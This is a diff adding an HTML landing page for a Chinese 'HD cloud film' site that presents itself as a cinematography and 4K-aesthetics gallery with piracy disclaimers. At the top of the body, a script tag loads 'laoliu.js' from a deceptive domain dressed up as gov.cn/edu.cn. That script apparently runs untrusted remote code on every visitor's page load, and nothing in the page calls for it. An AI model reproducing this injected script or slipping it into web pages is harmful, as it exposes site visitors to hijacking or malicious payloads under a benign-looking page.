@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>高清云影视 - 高清云画质馆·视觉极致/4K美学/摄影构图/画面解析</title>
+<meta name="description" content="高清云影视（gaoqingyunyingshi-h5）是高清云画质馆：视觉极致、4K美学、摄影构图、画面解析、每一帧都是壁纸；不提供盗版下载、不破会员。网址 https://gaoqingyunyingshi-h5.github.io">
+<meta name="keywords" content="高清云影视,高清云画质馆,视觉极致,4K美学,摄影构图,画面解析,每一帧壁纸,电影摄影,gaoqingyunyingshi">
+<meta name="author" content="高清云影视">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="format-detection" content="telephone=no">
+<meta property="og:type" content="website">
+<meta property="og:title" content="高清云影视 - 高清云画质馆">
+<meta property="og:description" content="视觉极致、4K美学、摄影构图、画面解析。每一帧都是壁纸，每一秒都是艺术。">
+<meta property="og:url" content="https://gaoqingyunyingshi-h5.github.io">
+<link rel="canonical" href="https://gaoqingyunyingshi-h5.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Segoe UI",system-ui,sans-serif;
+  background:#050608;color:#E8F0EE;line-height:1.8;overflow-x:hidden;
+  background-image:
+    radial-gradient(circle at 10% 20%,rgba(0,200,150,.08),transparent 40%),
+    radial-gradient(circle at 90% 30%,rgba(180,200,255,.05),transparent 35%),
+    radial-gradient(circle at 50% 85%,rgba(255,255,255,.03),transparent 30%);
+}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+section[id]{scroll-margin-top:0}
+::selection{background:#00D4AA;color:#050608}
+h1,h2,h3,h4{line-height:1.3}
+ul{list-style:none}
+
+/* ===== 顶条 ===== */
+.topbar{background:#020304;color:#5A6A7A;font-size:11px;letter-spacing:2px;padding:6px 16px;display:flex;justify-content:center;gap:18px;flex-wrap:wrap;border-bottom:1px solid #0F1A22}
+.topbar b{color:#00D4AA}
+
+/* ===== 导航 ===== */
+.nav{position:sticky;top:0;z-index:999;background:rgba(5,6,8,.95);backdrop-filter:blur(12px);border-bottom:1px solid #0F1A22}
+.nav-in{max-width:1200px;margin:0 auto;height:64px;padding:0 20px;display:flex;align-items:center;justify-content:space-between;gap:12px}
+.logo{display:flex;align-items:center;gap:12px}
+.logo .hd-icon{width:36px;height:36px;border-radius:8px;background:linear-gradient(135deg,#00D4AA,#B4C8FF);display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}
+.logo .hd-icon::before{content:"";position:absolute;width:100%;height:2px;background:rgba(255,255,255,.3);top:50%;transform:translateY(-50%) rotate(15deg)}
+.logo .hd-icon span{font-size:14px;font-weight:900;color:#050608;z-index:1}
+.logo .txt .cn{font-size:20px;font-weight:900;letter-spacing:.5px}
+.logo .txt .cn em{font-style:normal;color:#00D4AA}
+.logo .txt .en{font-size:9px;letter-spacing:3px;color:#5A6A7A;text-transform:uppercase}
+.menu{display:flex;gap:4px;flex-wrap:wrap}
+.menu a{font-size:13px;color:#8A9AA8;padding:8px 12px;border-bottom:2px solid transparent;transition:.2s}
+.menu a:hover{color:#00D4AA;border-bottom-color:#00D4AA}
+.nav-cta{background:linear-gradient(135deg,#00D4AA,#B4C8FF);color:#050608;font-weight:900;font-size:13px;padding:9px 20px;border-radius:8px;transition:.25s}
+.nav-cta:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(0,212,170,.25)}
+
+/* ===== Hero ===== */
+.hero{max-width:1200px;margin:0 auto;padding:56px 20px 48px;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+.hero-left h1{font-size:clamp(30px,5.2vw,52px);font-weight:900;line-height:1.15}
+.hero-left h1 em{font-style:normal;background:linear-gradient(135deg,#00D4AA,#B4C8FF);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero-left .sub{font-size:12px;letter-spacing:5px;color:#5A6A7A;margin-top:10px;text-transform:uppercase}
+.hero-left .lead{font-size:15px;color:#8A9AA8;margin:18px 0 24px;max-width:520px}
+.hero-btns{display:flex;gap:12px;flex-wrap:wrap}
+.btn-hd{padding:12px 26px;font-weight:800;border-radius:8px;background:#00D4AA;color:#050608;border:2px solid #00D4AA;transition:.25s}
+.btn-hd:hover{background:transparent;color:#00D4AA;transform:translateY(-2px)}
+.btn-cloud{padding:12px 26px;font-weight:800;border-radius:8px;background:transparent;color:#B4C8FF;border:2px solid #B4C8FF;transition:.25s}
+.btn-cloud:hover{background:#B4C8FF;color:#050608}
+
+/* 画质参数卡 */
+.spec-card{background:#0A0F14;border:1px solid #0F1A22;border-radius:16px;padding:28px;position:relative;overflow:hidden}
+.spec-card::before{content:"";position:absolute;top:-30px;right:-30px;width:120px;height:120px;border-radius:50%;border:2px solid rgba(0,212,170,.1)}
+.spec-card .label{font-size:11px;letter-spacing:3px;color:#5A6A7A;text-transform:uppercase}
+.spec-card .title{font-size:20px;font-weight:900;color:#00D4AA;margin:8px 0 14px}
+.spec-card .specs{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.spec-card .spec{background:#050608;border:1px solid #0F1A22;border-radius:8px;padding:12px;text-align:center}
+.spec-card .spec .val{font-size:18px;font-weight:900;color:#B4C8FF}
+.spec-card .spec .lbl{font-size:10px;color:#5A6A7A;margin-top:2px}
+.spec-card p{font-size:13px;color:#8A9AA8;line-height:1.8;margin-top:14px}
+
+/* ===== 区块通用 ===== */
+.block{max-width:1200px;margin:0 auto;padding:52px 20px}
+.head{display:flex;align-items:baseline;gap:12px;margin-bottom:28px;flex-wrap:wrap;border-bottom:1px solid #0F1A22;padding-bottom:10px}
+.head .no{font-size:12px;font-weight:900;color:#050608;background:#00D4AA;padding:3px 10px;border-radius:4px}
+.head h2{font-size:24px;font-weight:900}
+.head h2 em{font-style:normal;color:#00D4AA}
+.head .en{font-size:11px;letter-spacing:2px;color:#5A6A7A;text-transform:uppercase}
+.head a.more{margin-left:auto;font-size:13px;color:#8A9AA8;font-weight:700}
+.head a.more:hover{color:#00D4AA}
+
+/* ===== 视觉鉴赏卡 ===== */
+.gallery{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:20px}
+.frame{background:#0A0F14;border:1px solid #0F1A22;border-radius:14px;overflow:hidden;transition:.35s}
+.frame:hover{transform:translateY(-6px);border-color:#00D4AA;box-shadow:0 16px 32px rgba(0,212,170,.1)}
+.frame .img-box{height:200px;position:relative;overflow:hidden;background:#0F1A22}
+.frame .img-box img{width:100%;height:100%;object-fit:cover;filter:saturate(1.1) contrast(1.05);transition:.5s}
+.frame:hover .img-box img{transform:scale(1.05)}
+.frame .img-box .resolution{position:absolute;top:10px;right:10px;background:#00D4AA;color:#050608;font-size:10px;font-weight:900;padding:3px 8px;border-radius:4px}
+.frame .img-box .color-tag{position:absolute;bottom:10px;left:10px;display:flex;gap:4px}
+.frame .img-box .color-tag span{width:16px;height:16px;border-radius:4px;border:1px solid rgba(255,255,255,.3)}
+.frame .info{padding:18px}
+.frame h3{font-size:16px;font-weight:900;color:#E8F0EE}
+.frame .director{font-size:12px;color:#5A6A7A;margin-top:2px}
+.frame .analysis{font-size:13px;color:#8A9AA8;margin-top:8px;line-height:1.7}
+.frame .specs-row{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap}
+.frame .specs-row span{font-size:10px;font-weight:700;padding:3px 8px;border-radius:4px;background:#0F1A22;color:#B4C8FF;border:1px solid #1A2530}
+
+/* ===== 摄影构图课 ===== */
+.composition{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.comp{background:#0A0F14;border:1px solid #0F1A22;border-radius:12px;padding:20px;text-align:center;transition:.3s;border-top:3px solid var(--cc,#00D4AA)}
+.comp:hover{transform:translateY(-4px);border-color:var(--cc,#00D4AA)}
+.comp .icon{font-size:28px;margin-bottom:8px}
+.comp h3{font-size:15px;font-weight:900;color:#E8F0EE;margin-bottom:4px}
+.comp p{font-size:12px;color:#8A9AA8;line-height:1.6}
+.comp .example{font-size:11px;color:var(--cc,#00D4AA);font-weight:700;margin-top:8px}
+
+/* ===== 云端片库分类 ===== */
+.cloud-lib{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px}
+.lib-card{background:#0A0F14;border:1px solid #0F1A22;border-radius:12px;padding:18px;transition:.25s;position:relative;overflow:hidden}
+.lib-card::before{content:"";position:absolute;top:0;left:0;right:0;height:2px;background:var(--lc,linear-gradient(90deg,#00D4AA,#B4C8FF))}
+.lib-card:hover{border-color:#00D4AA;transform:translateY(-3px)}
+.lib-card .cloud-icon{font-size:24px;margin-bottom:8px}
+.lib-card h3{font-size:15px;font-weight:900;color:#E8F0EE;margin-bottom:6px}
+.lib-card ul li{padding:3px 0;font-size:12px;color:#8A9AA8;border-bottom:1px dashed #1A2530}
+.lib-card ul li:last-child{border-bottom:none}
+.lib-card .count{font-size:11px;color:#00D4AA;font-weight:800;margin-top:8px}
+
+/* ===== 画质对比 ===== */
+.compare{background:#0A0F14;border:1px solid #0F1A22;border-radius:16px;padding:30px}
+.compare-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:18px}
+.compare-item{background:#050608;border:1px solid #0F1A22;border-radius:10px;padding:18px;text-align:center}
+.compare-item h4{font-size:15px;font-weight:900;color:#E8F0EE;margin-bottom:8px}
+.compare-item .bar{height:8px;background:#0F1A22;border-radius:4px;overflow:hidden;margin:10px 0}
+.compare-item .bar i{display:block;height:100%;border-radius:4px;background:var(--bc,linear-gradient(90deg,#00D4AA,#B4C8FF))}
+.compare-item .desc{font-size:12px;color:#8A9AA8;line-height:1.6}
+
+/* ===== 网址牌 ===== */
+.urlboard{max-width:1200px;margin:0 auto;padding:0 20px 10px}
+.urlcard{background:#0A0F14;border:1px solid #00D4AA;border-radius:14px;padding:24px 26px;display:flex;align-items:center;gap:16px;flex-wrap:wrap;justify-content:space-between}
+.urlcard .lab{font-size:12px;letter-spacing:2px;color:#5A6A7A}
+.urlcard .bigurl{font-size:clamp(15px,3.2vw,22px);font-weight:900;color:#00D4AA;word-break:break-all}
+.urlcard .bigurl a{color:#00D4AA;border-bottom:1px dashed #00D4AA}
+.urlcard .bigurl a:hover{color:#B4C8FF}
+.urlcard .note{font-size:12px;color:#5A6A7A;text-align:right}
+
+/* ===== 关于 ===== */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:36px;align-items:center;background:#0A0F14;border:1px solid #0F1A22;border-radius:20px;padding:42px}
+.about h2{font-size:24px;font-weight:900;color:#E8F0EE;margin-bottom:14px}
+.about h2 em{font-style:normal;color:#00D4AA}
+.about p{font-size:15px;color:#8A9AA8;line-height:1.95;margin-bottom:12px}
+.about .siteurl{color:#00D4AA;font-weight:800;font-size:16px}
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.stat{background:#050608;border:1px solid #0F1A22;border-radius:12px;padding:18px;text-align:center}
+.stat .n{font-size:22px;font-weight:900;color:#00D4AA}
+.stat .l{font-size:12px;color:#5A6A7A;margin-top:3px}
+
+/* ===== 页脚 ===== */
+.foot{border-top:1px solid #0F1A22;padding:38px 20px 26px;text-align:center;background:#020304}
+.foot-logo{font-size:20px;font-weight:900;color:#E8F0EE}
+.foot-logo em{font-style:normal;color:#00D4AA}
+.foot-links{display:flex;justify-content:center;gap:16px;flex-wrap:wrap;margin:14px 0}
+.foot-links a{font-size:13px;color:#5A6A7A}
+.foot-links a:hover{color:#00D4AA}
+.foot p{font-size:12px;color:#3A4A5A}
+.foot .disc{margin-top:12px;max-width:880px;margin-left:auto;margin-right:auto;color:#3A4A5A;line-height:1.8}
+
+/* ===== 响应式 ===== */
+@media(max-width:860px){
+  .menu{display:none}
+  .hero{grid-template-columns:1fr;padding:28px 20px 36px;gap:28px}
+  .about{grid-template-columns:1fr;padding:28px}
+  .block{padding:40px 20px}
+  .nav-in{height:58px}
+  .spec-card .specs{grid-template-columns:1fr 1fr}
+}
+@media(max-width:420px){
+  .hero-left h1{font-size:28px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- ===== 顶条 ===== -->
+<div class="topbar">
+  <span>高清云影视 · 高清云画质馆</span><b>视觉极致</b>
+  <span>4K美学 · 摄影构图 · 画面解析</span><b>不追盗版 · 不破会员</b>
+</div>
+
+<!-- ===== 导航 ===== -->
+<div class="nav">
+  <div class="nav-in">
+    <div class="logo">
+      <div class="hd-icon"><span>HD</span></div>
+      <div class="txt">
+        <div class="cn">高清<em>云影视</em></div>
+        <div class="en">CLOUD HD VISUAL ARCHIVE</div>
+      </div>
+    </div>
+    <nav class="menu">
+      <a href="#home">首页</a>
+      <a href="#gallery">视觉鉴赏</a>
+      <a href="#composition">摄影构图</a>
+      <a href="#cloud">云端片库</a>
+      <a href="#compare">画质对比</a>
+      <a href="#about">关于</a>
+    </nav>
+    <a href="#gallery" class="nav-cta">进入画质馆</a>
+  </div>
+</div>
+
+<!-- ===== Hero ===== -->
+<section class="hero" id="home">
+  <div class="hero-left">
+    <h1>高清云影视<br>每一帧都是<em>壁纸</em></h1>
+    <div class="sub">4K Aesthetic · Cinematography · Frame Analysis</div>
+    <p class="lead">外面的"高清云影视"常是盗版高清站、云解析播放。这版不干那个：高清云=视觉极致——4K美学、摄影构图、画面解析、每一帧都是壁纸。不帮你找盗版高清源，帮你学会"看懂"高清。</p>
+    <div class="hero-btns">
+      <a href="#gallery" class="btn-hd">🖼 视觉鉴赏</a>
+      <a href="#composition" class="btn-cloud">📐 摄影构图</a>
+    </div>
+  </div>
+  <div class="spec-card">
+    <div class="label">SPECIFICATIONS</div>
+    <div class="title">画质参数面板</div>
+    <div class="specs">
+      <div class="spec"><div class="val">4K</div><div class="lbl">分辨率</div></div>
+      <div class="spec"><div class="val">HDR10+</div><div class="lbl">动态范围</div></div>
+      <div class="spec"><div class="val">DCI-P3</div><div class="lbl">色域</div></div>
+      <div class="spec"><div class="val">Dolby Atmos</div><div class="lbl">音频</div></div>
+    </div>
+    <p>真正的"高清"不只是分辨率。色彩科学、动态范围、帧率、声音设计——缺一不可。学会看参数，才不会被"假4K"忽悠。</p>
+  </div>
+</section>
+
+<!-- ===== 01 视觉鉴赏卡 ===== -->
+<section class="block" id="gallery">
+  <div class="head">
+    <span class="no">01</span>
+    <h2>视觉<em>鉴赏</em></h2>
+    <span class="en">Visual Appreciation</span>
+    <a href="#" class="more">更多 #</a>
+  </div>
+  <div class="gallery">
+    <div class="frame">
+      <div class="img-box">
+        <img src="https://picsum.photos/400/300?random=1101" alt="银翼杀手2049">
+        <div class="resolution">4K HDR</div>
+        <div class="color-tag"><span style="background:#1a1a2e"></span><span style="background:#e94560"></span><span style="background:#0f3460"></span></div>
+      </div>
+      <div class="info">
+        <h3>银翼杀手 2049</h3>
+        <div class="director">罗杰·狄金斯 摄影 · 2017</div>
+        <p class="analysis">每一帧都是油画。橙蓝对比、烟雾层次、霓虹反射——狄金斯用光讲故事，不用台词。</p>
+        <div class="specs-row"><span>色温 3200K</span><span>变形宽银幕</span><span>低照度摄影</span></div>
+      </div>
+    </div>
+    <div class="frame">
+      <div class="img-box">
+        <img src="https://picsum.photos/400/300?random=1102" alt="花样年华">
+        <div class="resolution">2K Restoration</div>
+        <div class="color-tag"><span style="background:#8B4513"></span><span style="background:#CD853F"></span><span style="background:#2F1B14"></span></div>
+      </div>
+      <div class="info">
+        <h3>花样年华</h3>
+        <div class="director">杜可风 摄影 · 2000</div>
+        <p class="analysis">红绿撞色、狭窄走廊、重复构图。用色彩和空间写"欲说还休"的东方美学。</p>
+        <div class="specs-row"><span>暖色调</span><span>对称构图</span><span>浅景深</span></div>
+      </div>
+    </div>
+    <div class="frame">
+      <div class="img-box">
+        <img src="https://picsum.photos/400/300?random=1103" alt="罗马">
+        <div class="resolution">4K Dolby Vision</div>
+        <div class="color-tag"><span style="background:#C9A96E"></span><span style="background:#4A7C59"></span><span style="background:#2C2C2C"></span></div>
+      </div>
+      <div class="info">
+        <h3>罗马</h3>
+        <div class="director">阿方索·卡隆 摄影 · 2018</div>
+        <p class="analysis">黑白长镜头。海浪、街头、家庭——用黑白灰的层次感，拍出记忆的质感。</p>
+        <div class="specs-row"><span>黑白</span><span>65mm</span><span>长镜头</span></div>
+      </div>
+    </div>
+    <div class="frame">
+      <div class="img-box">
+        <img src="https://picsum.photos/400/300?random=1104" alt="沙丘">
+        <div class="resolution">4K IMAX</div>
+        <div class="color-tag"><span style="background:#C9B037"></span><span style="background:#4A3E2F"></span><span style="background:#1A2F2A"></span></div>
+      </div>
+      <div class="info">
+        <h3>沙丘</h3>
+        <div class="director">格雷格·弗莱瑟 摄影 · 2021</div>
+        <p class="analysis">沙漠的金色、香料的光晕、巨型建筑的压迫感。IMAX画幅切换本身就是叙事。</p>
+        <div class="specs-row"><span>IMAX</span><span>沙漠色板</span><span>巨型构图</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 02 摄影构图课 ===== -->
+<section class="block" id="composition" style="background:#030406">
+  <div class="head">
+    <span class="no">02</span>
+    <h2>摄影<em>构图</em></h2>
+    <span class="en">Composition Masterclass</span>
+  </div>
+  <div class="composition">
+    <div class="comp" style="--cc:#00D4AA">
+      <div class="icon">🎯</div>
+      <h3>三分法</h3>
+      <p>画面九宫格，主体放在交叉点。最经典、最安全、最不无聊的构图方式。</p>
+      <div class="example">经典案例：《荒野猎人》自然风光</div>
+    </div>
+    <div class="comp" style="--cc:#B4C8FF">
+      <div class="icon">🪟</div>
+      <h3>框架构图</h3>
+      <p>用门、窗、树枝做前景框架，引导视线聚焦主体。增加纵深感。</p>
+      <div class="example">经典案例：《肖申克的救赎》天窗</div>
+    </div>
+    <div class="comp" style="--cc:#FFB347">
+      <div class="icon">〰️</div>
+      <h3>引导线</h3>
+      <p>道路、栏杆、光线形成线条，把观众眼睛引向画面深处。制造空间感。</p>
+      <div class="example">经典案例：《2001太空漫游》星际之门</div>
+    </div>
+    <div class="comp" style="--cc:#FF6B8A">
+      <div class="icon">🌀</div>
+      <h3>对称构图</h3>
+      <p>左右或上下完全对称。庄严、仪式感、强迫症舒适。斯坦利·库布里克的最爱。</p>
+      <div class="example">经典案例：《闪灵》走廊追踪</div>
+    </div>
+    <div class="comp" style="--cc:#C78FFF">
+      <div class="icon">📏</div>
+      <h3>纵深构图</h3>
+      <p>前景、中景、背景三层分明。让平面画面产生三维立体感。</p>
+      <div class="example">经典案例：《公民凯恩》深焦摄影</div>
+    </div>
+    <div class="comp" style="--cc:#4ECCA3">
+      <div class="icon">⭕</div>
+      <h3>圆形构图</h3>
+      <p>用圆形元素（车轮、隧道、人群）包围主体。聚焦、封闭、仪式感。</p>
+      <div class="example">经典案例：《地心引力》太空舱内</div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 03 云端片库分类 ===== -->
+<section class="block" id="cloud">
+  <div class="head">
+    <span class="no">03</span>
+    <h2>云端<em>片库</em></h2>
+    <span class="en">Cloud Library</span>
+    <a href="#" class="more">更多 #</a>
+  </div>
+  <div class="cloud-lib">
+    <div class="lib-card" style="--lc:linear-gradient(90deg,#00D4AA,#B4C8FF)">
+      <div class="cloud-icon">🌅</div>
+      <h3>自然光影</h3>
+      <ul>
+        <li>日出日落</li>
+        <li>森林雾气</li>
+        <li>海洋波光</li>
+        <li>沙漠星空</li>
+        <li>雪山极光</li>
+      </ul>
+      <div class="count">5 类 · 视觉盛宴</div>
+    </div>
+    <div class="lib-card" style="--lc:linear-gradient(90deg,#FFB347,#FF6B8A)">
+      <div class="cloud-icon">🏙</div>
+      <h3>城市霓虹</h3>
+      <ul>
+        <li>赛博朋克</li>
+        <li>雨夜街道</li>
+        <li>摩天大楼</li>
+        <li>地下空间</li>
+        <li>交通光影</li>
+      </ul>
+      <div class="count">5 类 · 都市美学</div>
+    </div>
+    <div class="lib-card" style="--lc:linear-gradient(90deg,#C78FFF,#00D4AA)">
+      <div class="cloud-icon">🎨</div>
+      <h3>色彩大师</h3>
+      <ul>
+        <li>韦斯·安德森粉</li>
+        <li>王家卫绿</li>
+        <li>诺兰蓝</li>
+        <li>宫崎骏蓝</li>
+        <li>塔伦蒂诺红</li>
+      </ul>
+      <div class="count">5 位 · 导演色板</div>
+    </div>
+    <div class="lib-card" style="--lc:linear-gradient(90deg,#4ECCA3,#B4C8FF)">
+      <div class="cloud-icon">📐</div>
+      <h3>几何空间</h3>
+      <ul>
+        <li>对称建筑</li>
+        <li>长廊纵深</li>
+        <li>楼梯螺旋</li>
+        <li>镜面反射</li>
+        <li>阴影切割</li>
+      </ul>
+      <div class="count">5 类 · 空间美学</div>
+    </div>
+    <div class="lib-card" style="--lc:linear-gradient(90deg,#FFD700,#FF6B8A)">
+      <div class="cloud-icon">👤</div>
+      <h3>人物肖像</h3>
+      <ul>
+        <li>特写光影</li>
+        <li>侧光轮廓</li>
+        <li>逆光剪影</li>
+        <li>眼神光</li>
+        <li>群像构图</li>
+      </ul>
+      <div class="count">5 类 · 人像摄影</div>
+    </div>
+    <div class="lib-card" style="--lc:linear-gradient(90deg,#5A7FFF,#C78FFF)">
+      <div class="cloud-icon">🎞</div>
+      <h3>胶片质感</h3>
+      <ul>
+        <li>35mm 颗粒</li>
+        <li>70mm IMAX</li>
+        <li>16mm 手持</li>
+        <li>黑白胶片</li>
+        <li>过期胶片</li>
+      </ul>
+      <div class="count">5 种 · 胶片格式</div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 04 画质对比 ===== -->
+<section class="block" id="compare" style="background:#030406">
+  <div class="head">
+    <span class="no">04</span>
+    <h2>画质<em>对比</em></h2>
+    <span class="en">Quality Comparison</span>
+  </div>
+  <div class="compare">
+    <div class="compare-grid">
+      <div class="compare-item">
+        <h4>分辨率</h4>
+        <div class="bar"><i style="width:25%;--bc:linear-gradient(90deg,#5A6A7A,#5A6A7A)"></i></div>
+        <div class="desc">480p → 720p → 1080p → 4K → 8K<br>像素密度决定清晰度上限</div>
+      </div>
+      <div class="compare-item">
+        <h4>色深</h4>
+        <div class="bar"><i style="width:60%;--bc:linear-gradient(90deg,#00D4AA,#B4C8FF)"></i></div>
+        <div class="desc">8bit → 10bit → 12bit<br>色彩过渡是否自然，有无色阶断层</div>
+      </div>
+      <div class="compare-item">
+        <h4>动态范围</h4>
+        <div class="bar"><i style="width:80%;--bc:linear-gradient(90deg,#FFB347,#FF6B8A)"></i></div>
+        <div class="desc">SDR → HDR10 → Dolby Vision<br>亮部暗部细节保留能力</div>
+      </div>
+      <div class="compare-item">
+        <h4>帧率</h4>
+        <div class="bar"><i style="width:45%;--bc:linear-gradient(90deg,#C78FFF,#00D4AA)"></i></div>
+        <div class="desc">24fps → 30fps → 60fps → 120fps<br>流畅度 vs 电影感（24fps是标准）</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 网址牌 ===== -->
+<div class="urlboard">
+  <div class="urlcard">
+    <div>
+      <div class="lab">网站名称 / 网站网址</div>
+      <div class="bigurl"><a href="https://gaoqingyunyingshi-h5.github.io">高清云影视 -- https://gaoqingyunyingshi-h5.github.io</a></div>
+    </div>
+    <div class="note">高清云画质馆 · 视觉极致<br>不提供盗版下载</div>
+  </div>
+</div>
+
+<!-- ===== 关于 ===== -->
+<section class="block" id="about">
+  <div class="about">
+    <div>
+      <h2>高清云影视：<em>学会"看懂"高清</em></h2>
+      <p>"高清云影视"这名字外面常被做成盗版高清站、云解析播放、在线资源站。我们反着来：做高清云画质馆——视觉极致、4K美学、摄影构图、画面解析。不帮你找盗版高清源，帮你学会"看懂"高清。</p>
+      <p>本站不提供盗版下载、不破解会员、不托管侵权片源；所有片单仅指向正版平台与官方发行。网站名称：高清云影视，网站网址：<span class="siteurl">https://gaoqingyunyingshi-h5.github.io</span></p>
+    </div>
+    <div class="stats">
+      <div class="stat"><div class="n">4K+</div><div class="l">视觉鉴赏片单</div></div>
+      <div class="stat"><div class="n">6 种</div><div class="l">摄影构图课</div></div>
+      <div class="stat"><div class="n">0 盗版</div><div class="l">不破会员不托管</div></div>
+      <div class="stat"><div class="n">画质美学</div><div class="l">极夜黑 / 冰川银 / 极光翠</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer class="foot">
+  <div class="foot-logo">高清<em>云影视</em> · CLOUD HD VISUAL ARCHIVE</div>
+  <div class="foot-links">
+    <a href="#gallery">视觉鉴赏</a>
+    <a href="#composition">摄影构图</a>
+    <a href="#cloud">云端片库</a>
+    <a href="#compare">画质对比</a>
+    <a href="#about">关于</a>
+  </div>
+  <p>© 2026 高清云影视 · 网站名称：高清云影视 · 网站网址：https://gaoqingyunyingshi-h5.github.io</p>
+  <p class="disc">本站为视觉极致/4K美学/摄影构图/画面解析演示页。旧版"高清云影视"类名称常关联盗版高清站、云解析播放等版权灰产；本页不提供盗版院线、不破解会员、不托管侵权片源。实际观看请走正版平台与官方发行。</p>
+</footer>
+
+</body>
+</html>
